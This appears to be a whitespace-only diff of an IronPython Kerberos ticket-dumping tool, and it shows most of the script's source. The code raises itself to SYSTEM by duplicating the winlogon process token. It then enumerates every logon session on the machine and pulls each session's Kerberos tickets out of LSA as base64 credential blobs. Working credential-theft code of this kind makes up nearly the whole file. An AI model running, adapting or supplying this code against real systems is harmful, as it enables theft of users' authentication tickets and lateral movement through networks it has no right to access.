@@ -1,5 +1,5 @@
 ##################################################
-## IronPython Ticket Dumper 
+## IronPython Ticket Dumper
 ##################################################
 ## Author: Hubbl3
 ## Thanks to Kevin Clark for letting me base this off his csharptoolbox project
@@ -33,18 +33,18 @@ except Exception as e:
     print(f'Error: {str(e)}')
 
 class LSA_STRING_IN(ctypes.Structure):
-    
+
     #https://stackoverflow.com/questions/24640817/python-ctypes-definition-for-c-struct
     _fields_ = [('Length', wintypes.USHORT),
                 ('MaximumLength',wintypes.USHORT),
                 ('Buffer', ctypes.c_char_p)]
 
 class LSA_STRING_OUT(ctypes.Structure):
-    
+
     _fields_= [('Length', ctypes.c_uint16),
                ('MaximumLength',ctypes.c_uint16),
                ('Buffer', wintypes.HANDLE)]
-               
+
 #Could probably reuse LSA_STRING_OUT but this makes later code more readable
 class LSA_UNICODE_STRING(ctypes.Structure):
     _fields_ = [('Length', ctypes.c_uint16),
@@ -56,14 +56,14 @@ class LUID(ctypes.Structure):
 
     _fields_=[('LowPart', wintypes.UINT),
               ('HighPart', wintypes.INT)]
-              
+
 class SECURITY_HANDLE(ctypes.Structure):
-    
+
     _fields_=[('LowPart', wintypes.HANDLE),
               ('HighPart', wintypes.HANDLE)]
-              
+
 class SECURITY_LOGON_SESSION_DATA(ctypes.Structure):
-    
+
     _fields_=[('Size', wintypes.UINT),
               ('LogonId', LUID),
               ('UserName', LSA_STRING_OUT),
@@ -76,7 +76,7 @@ class SECURITY_LOGON_SESSION_DATA(ctypes.Structure):
               ('LogonServer', LSA_STRING_OUT),
               ('DnsDomainName', LSA_STRING_OUT),
               ('Upn',LSA_STRING_OUT)]
-              
+
 
 class KERB_CRYPTO_KEY(ctypes.Structure):
     _fields_=[('KeyType',wintypes.INT),
@@ -106,12 +106,12 @@ class KERB_TICKET_CACHE_INFO_EX(ctypes.Structure):
               ('ClientRealm', LSA_STRING_OUT),
               ('ServerName', LSA_STRING_OUT),
               ('ServerRealm', LSA_STRING_OUT),
-              ('StartTime', ctypes.c_int64), 
-              ('EndTime', ctypes.c_int64), 
+              ('StartTime', ctypes.c_int64),
+              ('EndTime', ctypes.c_int64),
               ('RenewTime', ctypes.c_int64),
               ('EncryptionType', ctypes.c_int32),
               ('TicketFlags', ctypes.c_uint32)]
-              
+
 
 
 class KERB_QUERY_TKT_CACHE_REQUEST(ctypes.Structure):
@@ -119,7 +119,7 @@ class KERB_QUERY_TKT_CACHE_REQUEST(ctypes.Structure):
               ('LogonId', LUID)]
 
 class KERB_QUERY_TKT_CACHE_RESPONSE(ctypes.Structure):
-    
+
     _fields_=[('MessageType', wintypes.INT),
               ('NumberofTickets', wintypes.INT),
               ('Tickets', wintypes.HANDLE)]
@@ -141,21 +141,21 @@ class KERB_RETRIEVE_TKT_REQUEST2(ctypes.Structure):
               ('CacheOptions', ctypes.c_uint32),
               ('EncryptionType', wintypes.INT),
               ('CredentialsHandle', SECURITY_HANDLE)]
-              
+
     def __init__(self, messageType, logonId, targetName, ticketFlags, cacheOptions,encryptionType):
-    
+
         self.MessageType = messageType
         self.LogonId = logonId
         self.TargetName = targetName
         self.TicketFlags = ticketFlags
         self.CacheOptions = cacheOptions
         self.EncryptionType = encryptionType
-              
+
 class KERB_RETRIEVE_TKT_RESPONSE(ctypes.Structure):
     _fields_=[('Ticket',KERB_EXTERNAL_TICKET)]
-        
+
 class TicketFlags(Enum):
-    
+
     reserved = 2147483648
     forwardable = 0x40000000
     forwarded = 0x20000000
@@ -181,7 +181,7 @@ class KRB_TICKET(ctypes.Structure):
                 ('ClientRealm', ctypes.c_wchar_p),
                 ('ServerName', ctypes.c_wchar_p),
                 ('ServerRealm', ctypes.c_wchar_p),
-                ('StartTime', ctypes.c_int64),  
+                ('StartTime', ctypes.c_int64),
                 ('EndTime', ctypes.c_int64),
                 ('RenewTime', ctypes.c_int64),
                 ('EncryptionType', ctypes.c_int32),
@@ -203,44 +203,44 @@ class LogonSessionData:
         self.Upn = upn
 
 def isAdministrator()->bool:
-    
+
     identity = SecurityIdentity.WindowsIdentity.GetCurrent()
     principal = SecurityIdentity.WindowsPrincipal(identity)
     isAdmin = principal.IsInRole(SecurityIdentity.WindowsBuiltInRole.Administrator)
     return isAdmin
-    
+
 def Elevate()->bool:
-    
+
     processes = Diagnostics.Process.GetProcessesByName("winlogon")
     handle  = processes[0].Handle
-    
+
     #wintypes.HANDLE is equivalent to IntPtr
     hToken = wintypes.HANDLE()
-    
+
     result = advapi32.OpenProcessToken(handle, 0x0002, ctypes.byref(hToken))
     if not result:
         print("[!] OpenProcessToken failed")
         return False
-    
+
     hDupToken = wintypes.HANDLE()
     result = advapi32.DuplicateToken(hToken, 2, ctypes.byref(hDupToken))
     if not result:
         print("[!] DuplicateToken failed")
         return False
-    
+
     result = advapi32.ImpersonateLoggedOnUser(hDupToken)
     if not result:
         print("[!] ImpersonateLoggedOnUser failed")
         return False
-    
+
     #close handles
     kernel32.CloseHandle(hToken)
     kernel32.CloseHandle(hDupToken)
-    
+
     currentSid = SecurityIdentity.WindowsIdentity.GetCurrent().User
     if not currentSid.IsWellKnown(SecurityIdentity.WellKnownSidType.LocalSystemSid):
         return False
-    
+
     return True
 
 def GetLogonSessions():
@@ -248,21 +248,21 @@ def GetLogonSessions():
     logonSessionCount = wintypes.INT()
     logonSessionList = wintypes.HANDLE()
     result = secur32.LsaEnumerateLogonSessions(ctypes.byref(logonSessionCount), ctypes.byref(logonSessionList))
-    
+
     if result != 0:
         print("Error enumerating logon sessions: " + result)
-    
+
     currentLogonSession =  logonSessionList
-    #Because as far as I know IronPython can't create blittable Structs we need to create a struct pointer  
+    #Because as far as I know IronPython can't create blittable Structs we need to create a struct pointer
     pSessionData = ctypes.POINTER(SECURITY_LOGON_SESSION_DATA)()
     sessionDataList = []
     for i in range(logonSessionCount.value):
-        
+
         secur32.LsaGetLogonSessionData(currentLogonSession, ctypes.byref(pSessionData))
         #Create a SECURITY_LOGON_SESSION_DATA struct object. We could retrieve the data directly from contents but this makes the code more readable
         sessionData = pSessionData.contents
-        
-        
+
+
         logonSessionData = LogonSessionData(
             logon_id= sessionData.LogonId,
             username= Marshal.PtrToStringUni(System.IntPtr(sessionData.UserName.Buffer), sessionData.UserName.Length // 2),
@@ -276,13 +276,13 @@ def GetLogonSessions():
             upn= Marshal.PtrToStringUni(System.IntPtr(sessionData.Upn.Buffer), sessionData.Upn.Length // 2),
             sid= None if sessionData.Sid == 0 else System.Security.Principal.SecurityIdentifier(System.IntPtr(sessionData.Sid))
         )
-    
+
         sessionDataList.append(logonSessionData)
-             
+
         #free memory
         secur32.LsaFreeReturnBuffer(pSessionData)
         currentLogonSession = ctypes.c_void_p(currentLogonSession.value + ctypes.sizeof(LUID))
-    
+
     secur32.LsaFreeReturnBuffer(logonSessionList)
     return sessionDataList
 def ValidateTime(timeInt):
@@ -291,17 +291,17 @@ def ValidateTime(timeInt):
     except:
         time = DateTime.FromFileTime(0).ToString()
     return time
-    
-#IronPython doesn't enforce type hinting. lsaHandle should be an IntPtr and kerberosAuthenticationPAckageIdentifier an int 
+
+#IronPython doesn't enforce type hinting. lsaHandle should be an IntPtr and kerberosAuthenticationPAckageIdentifier an int
 def GetTickets(lsaHandle, kerberosAuthenticationPackageIdentifier):
-    
+
     for logonSession in GetLogonSessions():
-        
+
         kerbQueryTKTCacheRequest = KERB_QUERY_TKT_CACHE_REQUEST()
-            
+
         kerbQueryTKTCacheRequest.MessageType = 14 #14 is KerbQueryTicketCacheExMessage
         kerbQueryTKTCacheRequest.LogonId = logonSession.LogonId
-        #must use ctypes.byref(). ctypes.pointer creates a python pointer to a ctypes pointer and causes the call to fail    
+        #must use ctypes.byref(). ctypes.pointer creates a python pointer to a ctypes pointer and causes the call to fail
         kerbQueryTKTCacheRequestPtr = ctypes.byref(kerbQueryTKTCacheRequest)
         ticketsPointer = ctypes.c_void_p()
         returnBufferLength = ctypes.c_uint32()
@@ -320,22 +320,22 @@ def GetTickets(lsaHandle, kerberosAuthenticationPackageIdentifier):
             print(ctypes.WinError(status))
             print("[!] LsaCallAuthenticationPackage failed")
             return False
-        
-        
-        
+
+
+
         if ticketsPointer.value == 0:
             print("[*] Failed to obtain ticketsPointer for "+ str(logonSession.LogonId.LowPart))
         else:
-            
+
             #takes the place of marshalptrtostructure
             casted = ctypes.cast(ticketsPointer, ctypes.POINTER(KERB_QUERY_TKT_CACHE_RESPONSE))
             kerbQueryTKTCacheResponse = casted.contents
-            
+
             #Ctypes structures have additional padding that can cause issues. Set for base64 system
             dataSize = ctypes.sizeof(KERB_TICKET_CACHE_INFO_EX())
-            
+
             for i in range(kerbQueryTKTCacheResponse.NumberofTickets-1):
-                
+
                 ticketAdress = ticketsPointer.value + 8+(i) * dataSize
                 ticketPtr = ctypes.c_void_p(ticketAdress)
                 castedTicket = ctypes.cast(ticketPtr, ctypes.POINTER(KERB_TICKET_CACHE_INFO_EX))
@@ -370,7 +370,7 @@ def GetTickets(lsaHandle, kerberosAuthenticationPackageIdentifier):
                 print("Ticket Data     : " + ticketData.decode('ascii'))
                 print("================================================================")
             secur32.LsaFreeReturnBuffer(kerbQueryTKTCacheRequest)
-                
+
 def ExtractTickets(lsaHandle, kerberosAuthenticationPackageIdentifier, logonId, serverName):
     request = KERB_RETRIEVE_TKT_REQUEST()
     response = KERB_RETRIEVE_TKT_RESPONSE()
@@ -384,7 +384,7 @@ def ExtractTickets(lsaHandle, kerberosAuthenticationPackageIdentifier, logonId, 
     request.TicketFlags = 0x0  # Use default ticket flags
     request.CacheOptions = 0x8  # KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
     request.EncryptionType = 0x0  # Use default encryption type
-    
+
     # Handling the targetName as LSA_UNICODE_STRING
     targetName = LSA_UNICODE_STRING()
     targetName.Length = ctypes.c_uint16(serverName.Length*2)
@@ -398,19 +398,19 @@ def ExtractTickets(lsaHandle, kerberosAuthenticationPackageIdentifier, logonId, 
     structSize = ctypes.sizeof(KERB_RETRIEVE_TKT_REQUEST)+ targetName.MaximumLength
     requestBuffer = ctypes.create_string_buffer(structSize)
     #copy the request struct to the buffer
-    
+
     ctypes.memmove(requestBuffer, ctypes.addressof(request), ctypes.sizeof(request))
     requestPtr = ctypes.byref(requestBuffer)
-    
+
     # Copy targetName buffer to the request structure manually
     targetNameBufferPtr = ctypes.c_void_p(ctypes.addressof(requestBuffer) + ctypes.sizeof(KERB_RETRIEVE_TKT_REQUEST))
-    ctypes.memmove(targetNameBufferPtr, targetName.Buffer, targetName.MaximumLength) 
+    ctypes.memmove(targetNameBufferPtr, targetName.Buffer, targetName.MaximumLength)
 
     contentsPtr = ctypes.cast(requestBuffer, ctypes.POINTER(KERB_RETRIEVE_TKT_REQUEST))
     contentsPtr.contents.TargetName.Buffer = ctypes.cast(targetNameBufferPtr, ctypes.c_wchar_p)
-    
-    
-   
+
+
+
     result = secur32.LsaCallAuthenticationPackage(
         lsaHandle,
         kerberosAuthenticationPackageIdentifier,
@@ -439,21 +439,21 @@ def ExtractTickets(lsaHandle, kerberosAuthenticationPackageIdentifier, logonId, 
         else:
             print("Invalid NTSTATUS Code:", protocolStatus2.value)
         return "Fail"
-        
+
 def main():
-    
+
     if not isAdministrator():
         print("[!] must run in an elevated context")
         return
-        
+
     if not Elevate():
         print("[!] Could not Elevate to System")
         return
     print("successfully elevated")
-    
+
     #Get Handle to LSA
     lsaHandle = wintypes.HANDLE()
-    
+
     if secur32.LsaConnectUntrusted(ctypes.byref(lsaHandle)) != 0:
         print("[!] LsaConnectUntrusted failed")
         advapi32.RevertToSelf()
